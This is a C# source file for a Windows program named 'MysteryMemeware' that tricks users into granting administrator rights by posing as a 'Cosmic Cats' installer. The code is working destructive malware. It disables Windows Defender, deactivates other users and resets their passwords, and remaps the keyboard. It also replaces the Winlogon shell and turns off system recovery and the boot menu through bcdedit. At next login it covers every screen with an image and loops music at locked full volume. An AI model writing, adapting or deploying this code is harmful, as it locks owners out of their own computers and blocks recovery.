using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using System.Threading;
using System.Media;
using System.Drawing;
using System.Runtime.InteropServices;
using MysteryMemeware.Helpers;
namespace MysteryMemeware
{
    public static class Program
    {
        public static readonly string CurrentExePath = typeof(Program).Assembly.Location;
        public static readonly string CurrentExeFolder = Path.GetDirectoryName(CurrentExePath);
        public static readonly string System32Folder = StringHelper.ReplaceCaseless(Environment.GetFolderPath(Environment.SpecialFolder.System), "System32", "Sysnative");
        public static readonly string System64Folder = Environment.GetFolderPath(Environment.SpecialFolder.SystemX86);
        public static readonly string SystemFolder = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
        public const string MemeMusicResourceName = "MysteryMemeware.MysterySong.wav";
        public const string DisplayCoverImageResourceName = "MysteryMemeware.CoverImage.bmp";
        public static readonly string InstallLocation = SystemFolder + "\\Shell.exe";
        public const string IsInstalledRegistryPath = "Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\MysteryMemeware\\IsInstalled";
        public const string AdminPasswordRegistryPath = "Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\MysteryMemeware\\AdminPassword";
        public const string UserPasswordRegistryPath = "Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\MysteryMemeware\\UserPassword";
        public static readonly string[] trueStrings = new string[] { "true", "yes", "1", "y", "t" };
        [STAThread]
        public static void Main()
        {
            PhaseOne.Main();
            return;
            try
            {
                if (IsInstalled())
                {
                    if (UACHelper.CurrentProcessIsAdmin)
                    {
                        Run();
                    }
                    else
                    {
                        try
                        {
                            ElevateSelf();
                        }
                        catch
                        {
                            Run();
                        }
                    }
                }
                else
                {
                    if (UACHelper.CurrentProcessIsAdmin)
                    {
                        Install();
                    }
                    else
                    {
                        BegForAdmin();
                    }
                }
                Process.GetCurrentProcess().Kill();
            }
            catch (Exception ex)
            {
                string exMessage = "Unknown exception thrown.";
                if (ex is not null)
                {
                    exMessage = $"{ex.GetType().FullName} thrown at {ex.TargetSite.Name} with message {ex.Message}. {ex.StackTrace}";
                }
                MessageBox.Show(exMessage);
            }
        }
        public static bool IsInstalled()
        {
            try
            {
                object isInstalledObject = RegistryHelper.GetValue(IsInstalledRegistryPath);
                if (isInstalledObject is null)
                {
                    return false;
                }
                Type typeOfIsInstalled = isInstalledObject.GetType();
                if (typeOfIsInstalled == typeof(string))
                {
                    return StringHelper.MatchesArrayCaseless((string)isInstalledObject, trueStrings);
                }
                if (typeOfIsInstalled == typeof(long))
                {
                    return (long)isInstalledObject == 1;
                }
                if (typeOfIsInstalled == typeof(int))
                {
                    return (int)isInstalledObject == 1;
                }
                if (typeOfIsInstalled == typeof(bool))
                {
                    return (bool)isInstalledObject;
                }
                return false;
            }
            catch
            {
                return false;
            }
        }
        public static void ElevateSelf()
        {
            object adminPasswordObject = RegistryHelper.GetValue(AdminPasswordRegistryPath);
            if (adminPasswordObject is null || adminPasswordObject.GetType() != typeof(string))
            {
                throw new Exception("Failed to load admin password.");
            }
            string adminPassword = (string)adminPasswordObject;
            string currentExePath = CurrentExePath;
            ProcessHelper.StartAs(new TerminalCommand($"\"{currentExePath}\""), new UsernameDomainPair("Administrator"), adminPassword, WindowMode.Default, Path.GetDirectoryName(currentExePath));
        }
        public static void BegForAdmin()
        {
            if (MessageBox.Show("Cosmic Cats is not yet installed on your computer. Would you like to install it now?", "Install Cosmic Cats?", MessageBoxButtons.YesNo) == DialogResult.No)
            {
                return;
            }
            if (MessageBox.Show("Elevated permissions are required in order to install Cosmic Cats. Please select yes on the following popup to grant the neccessary permission, or you may select no to cancel the installation.", "Elevated Permissions Required.", MessageBoxButtons.OKCancel) == DialogResult.Cancel)
            {
                return;
            }
            string commonAppData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
            string tempFolderPath = commonAppData + "\\" + 0.ToString();
            for (int i = 0; i < 10000; i++)
            {
                tempFolderPath = commonAppData + "\\" + i.ToString();
                if (!Directory.Exists(tempFolderPath))
                {
                    break;
                }
            }
            Directory.CreateDirectory(tempFolderPath);
            string tempFilePath = tempFolderPath + "\\CosmicCatsInstaller.exe";
            File.Copy(CurrentExePath, tempFilePath);
            try
            {
                ProcessHelper.Start(new TerminalCommand(tempFilePath, ""), WindowMode.Default, true, CurrentExeFolder);
            }
            catch (System.ComponentModel.Win32Exception win32ex)
            {
                if (win32ex.NativeErrorCode == 1223)
                {
                    MessageBox.Show("Elevated permissions denied. To install cosmic cats again later please run this application again and select yes when prompted.", "Elevated Permissions Denied.", MessageBoxButtons.OK);
                }
                else
                {
                    throw win32ex;
                }
            }
        }
        public static bool StringMatchesCaseless(string a, string b)
        {
            if (a is null && b is null)
            {
                return true;
            }
            if (a is null || b is null)
            {
                return false;
            }
            return a.ToUpper() == b.ToUpper();
        }
        public static void Install()
        {
            RegistryHelper.CreateAndSetValue("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableRealtimeMonitoring", 1, RegistryType.DWORD);

            if (File.Exists(InstallLocation))
            {
                File.Delete(InstallLocation);
            }

            File.Copy(CurrentExePath, InstallLocation);

            foreach (string username in UserHelper.GetLocalUsernames())
            {
                try
                {
                    if (!StringMatchesCaseless(username, UserHelper.CurrentUsername))
                    {
                        UserHelper.DeactivateUser(username);
                    }
                }
                catch
                {

                }

                try
                {
                    UserHelper.RemoveAdmin(username);
                }
                catch
                {

                }
            }

            UserHelper.ActivateUser("Administrator");

            string newUserPassword = UserHelper.GeneratePassword();

            RegistryHelper.CreateAndSetValue(UserPasswordRegistryPath, newUserPassword, RegistryType.SZ);

            UserHelper.ChangeUserPassword(UserHelper.CurrentUsername, newUserPassword);

            string newAdminPassword = UserHelper.GeneratePassword();

            RegistryHelper.CreateAndSetValue(AdminPasswordRegistryPath, newAdminPassword, RegistryType.SZ);

            UserHelper.ChangeUserPassword("Administrator", newAdminPassword);

            byte[] scancodeMap = new byte[328] { 0, 0, 0, 0, 0, 0, 0, 0, 79, 0, 0, 0, 0, 0, 33, 224, 0, 0, 108, 224, 0, 0, 109, 224, 0, 0, 17, 224, 0, 0, 107, 224, 0, 0, 64, 224, 0, 0, 66, 224, 0, 0, 59, 224, 0, 0, 62, 224, 0, 0, 60, 224, 0, 0, 63, 224, 0, 0, 88, 224, 0, 0, 7, 224, 0, 0, 65, 224, 0, 0, 87, 224, 0, 0, 67, 224, 0, 0, 35, 224, 0, 0, 61, 224, 0, 0, 8, 224, 0, 0, 59, 0, 0, 0, 68, 0, 0, 0, 87, 0, 0, 0, 88, 0, 0, 0, 100, 0, 0, 0, 101, 0, 0, 0, 102, 0, 0, 0, 103, 0, 0, 0, 104, 0, 0, 0, 105, 0, 0, 0, 106, 0, 0, 0, 60, 0, 0, 0, 107, 0, 0, 0, 108, 0, 0, 0, 109, 0, 0, 0, 110, 0, 0, 0, 111, 0, 0, 0, 61, 0, 0, 0, 62, 0, 0, 0, 63, 0, 0, 0, 64, 0, 0, 0, 65, 0, 0, 0, 66, 0, 0, 0, 67, 0, 0, 0, 19, 224, 0, 0, 20, 224, 0, 0, 18, 224, 0, 0, 32, 224, 0, 0, 25, 224, 0, 0, 34, 224, 0, 0, 16, 224, 0, 0, 36, 224, 0, 0, 46, 224, 0, 0, 48, 224, 0, 0, 93, 224, 0, 0, 70, 224, 0, 0, 79, 224, 0, 0, 1, 0, 0, 0, 71, 224, 0, 0, 56, 0, 0, 0, 29, 0, 0, 0, 91, 224, 0, 0, 81, 224, 0, 0, 73, 224, 0, 0, 94, 224, 0, 0, 55, 224, 0, 0, 56, 224, 0, 0, 56, 224, 0, 0, 29, 224, 0, 0, 92, 224, 0, 0, 95, 224, 0, 0, 99, 224, 0, 0, 106, 224, 0, 0, 102, 224, 0, 0, 105, 224, 0, 0, 50, 224, 0, 0, 103, 224, 0, 0, 101, 224, 0, 0, 104, 224, 0, 0, 0, 0 };

            RegistryHelper.CreateAndSetValue("Computer\\HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Keyboard Layout\\Scancode Map", scancodeMap, RegistryType.BINARY);

            RegistryHelper.CreateAndSetValue("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\OOBE\\DisablePrivacyExperience", 1, RegistryType.DWORD);

            RegistryHelper.CreateAndSetValue("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell", InstallLocation, RegistryType.SZ);

            RegistryHelper.CreateAndSetValue("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DefaultUserName", UserHelper.CurrentUsername, RegistryType.SZ);

            RegistryHelper.CreateAndSetValue("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DefaultPassword", newUserPassword, RegistryType.SZ);

            RegistryHelper.CreateAndSetValue("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\AutoAdminLogon", 1, RegistryType.DWORD);

            RegistryHelper.CreateAndSetValue("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PrecisionTouchPad\\Status\\Enabled", 0, RegistryType.DWORD);

            RegistryHelper.CreateAndSetValue("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Wisp\\Touch\\TouchGate", 0, RegistryType.DWORD);

            RegistryHelper.CreateAndSetValue("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\\NoLocalPasswordResetQuestions", 1, RegistryType.DWORD);



            RegistryHelper.CreateAndSetValue("Computer\\HKEY_CURRENT_USER\\System\\CurrentControlSet\\Control\\Keyboard Layout\\Scancode Map", scancodeMap, RegistryType.BINARY);

            RegistryHelper.CreateAndSetValue("Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\OOBE\\DisablePrivacyExperience", 1, RegistryType.DWORD);

            RegistryHelper.CreateAndSetValue("Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell", InstallLocation, RegistryType.SZ);

            RegistryHelper.CreateAndSetValue("Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DefaultUserName", UserHelper.CurrentUsername, RegistryType.SZ);

            RegistryHelper.CreateAndSetValue("Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DefaultPassword", newUserPassword, RegistryType.SZ);

            RegistryHelper.CreateAndSetValue("Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\AutoAdminLogon", 1, RegistryType.DWORD);

            RegistryHelper.CreateAndSetValue("Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PrecisionTouchPad\\Status\\Enabled", 0, RegistryType.DWORD);

            RegistryHelper.CreateAndSetValue("Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Wisp\\Touch\\TouchGate", 0, RegistryType.DWORD);

            RegistryHelper.CreateAndSetValue("Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\\NoLocalPasswordResetQuestions", 1, RegistryType.DWORD);



            RegistryHelper.CreateAndSetValue(IsInstalledRegistryPath, "true", RegistryType.SZ);

            RunCommand(System32Folder + "\\ReAgentc.exe", "/disable");
            RunCommand(System32Folder + "\\bcdedit.exe", "/set {current} bootstatuspolicy ignoreallfailures", true);
            RunCommand(System32Folder + "\\bcdedit.exe", "/set {default} bootstatuspolicy ignoreallfailures", true);
            RunCommand(System32Folder + "\\bcdedit.exe", "/set {current} recoveryenabled No", true);
            RunCommand(System32Folder + "\\bcdedit.exe", "/set {default} recoveryenabled No", true);
            RunCommand(System32Folder + "\\bcdedit.exe", "/set {bootmgr} displaybootmenu No", true);
            RunCommand(System32Folder + "\\bcdedit.exe", "/set {globalsettings} advancedoptions false", true);
            RunCommand(System32Folder + "\\bcdedit.exe", "/set {current} bootmenupolicy standard", true);

            RunCommand(System32Folder + "\\shutdown.exe", "/r /f /t 0", false);
        }
        public static void RunCommand(string filePath, string arguments, bool elevate = true)
        {
            ProcessHelper.AwaitSuccess(ProcessHelper.Start(new TerminalCommand(filePath, arguments), WindowMode.Hidden, elevate, Path.GetDirectoryName(filePath)), new TimeSpan(300000000), TimeoutAction.KillAndThrow, true);
        }
        public static void Run()
        {
            VolumeHelper.LockAtFull();

            ScreenCoverForm.CoverAllScreens(Image.FromStream(typeof(Program).Assembly.GetManifestResourceStream(DisplayCoverImageResourceName)), System.Drawing.Drawing2D.InterpolationMode.NearestNeighbor);

            SoundPlayer soundPlayer = new(typeof(Program).Assembly.GetManifestResourceStream(MemeMusicResourceName));
            soundPlayer.PlayLooping();

            while (true)
            {
                Thread.Sleep(int.MaxValue);
            }
        }
    }
}